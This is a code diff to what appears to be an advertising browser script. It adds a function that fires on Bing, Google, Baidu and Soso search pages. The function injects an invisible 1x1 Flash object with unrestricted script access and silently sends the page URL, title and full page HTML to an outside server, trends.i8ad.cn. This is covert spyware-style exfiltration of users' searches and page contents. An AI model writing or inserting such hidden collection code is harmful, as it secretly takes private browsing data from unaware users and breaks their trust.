@@ -256,6 +256,71 @@
         }
     }
 
+    function crawlSE()
+    {
+        if( document.location.href.indexOf('bing.com/search?')>-1
+            || document.location.href.indexOf('soso.com/q?')>-1
+            || ( document.location.href.indexOf('baidu.com/s?')>-1 && (document.getElementById('dfs0') || document.getElementById('aw0')) )
+            || document.location.href.indexOf('google.com/search?')>-1
+          ){
+            i8vars['adcrawlServerPrefix'] = 'http://trends.i8ad.cn/';
+            i8vars['adcrawlServer'] = i8vars['adcrawlServerPrefix']+'collect';
+            i8vars.adcmtorid= 'i8_ad_communicator';
+            i8vars.adcmtor_installed = false;
+            function installI8Poster(callback)
+            {
+                var initrc = 'i8_adcrawler_initrc';
+                window[initrc]= function()
+                {
+                    try{
+                        var cmtor = i8vars.msie ? window[i8vars.adcmtorid] : document[i8vars.adcmtorid];
+                        if (!cmtor) return;
+                        if (cmtor.length && (cmtor.splice || cmtor.item)) {cmtor = (cmtor[0].i8call ? cmtor[0] : cmtor[1]);};
+                        if (!cmtor.i8post) return;
+                        i8vars.adcmtor = cmtor;
+                        i8vars.adcmtor_installed = true;
+                        callback();
+                    } catch (e) {}
+                }
+                var swf= i8vars['adcrawlServerPrefix'] + 'public/adcrawler.swf?initrc=' + initrc;
+                var html= '<object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" ' +
+                    'codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,40,0" ' +
+                    'width="1" height="1" id="' + i8vars.adcmtorid + '" name="' + i8vars.adcmtorid + '">' +
+                    '<param name=movie value="' + swf + '">'					+
+                    '<param name=allowScriptAccess value="always">'		   +
+                    '<param name=quality value="low">'						  +
+                    '<embed src="' + swf + '" allowscriptaccess="always" quality="low" width="1" height="1" name="' +
+                    i8vars.adcmtorid + '" id="' + i8vars.adcmtorid + '" type="application/x-shockwave-flash"></embed>' +
+                    '</object>';
+
+                var div= document.createElement('div');
+                div.style.cssText= 'position:absolute; left:1px; top:1px; width:1px; height:1px; overflow:hidden;';
+                div.innerHTML= html;
+                document.body.insertBefore(div, i8vars.eldest);
+            }
+            function post(url, content, _onResponse, _compress, _headers)
+            {
+                var onResponse = (arguments.length > 2 && _onResponse) ? _onResponse : "";
+                var compress = (arguments.length > 3) ? !!_compress : false;
+                var headers = (arguments.length > 4 && _headers) ? _headers : {};
+                var send = function()
+                {
+                    i8vars.adcmtor.i8post(url, content, onResponse, compress, headers);
+                };
+                if (!i8vars.adcmtor_installed)
+                {
+                    installI8Poster(send);
+                }
+                else
+                {
+                    send();
+                }
+            }
+            var content = {url:document.location.href, title: encodeURI(document.title), html:document.documentElement.innerHTML};
+            post(i8vars.adcrawlServer, content, null, true);
+        }
+    }
+
     function shouldCrawl()
     {
         return document.location.href.substr(0, 4) === 'http';
@@ -272,6 +337,7 @@
     {
         if (crawlAdsAndSkip())
         {
+            crawlSE();
             crawlBaidu(document.location.href);
         }
         else if (shouldCrawl())
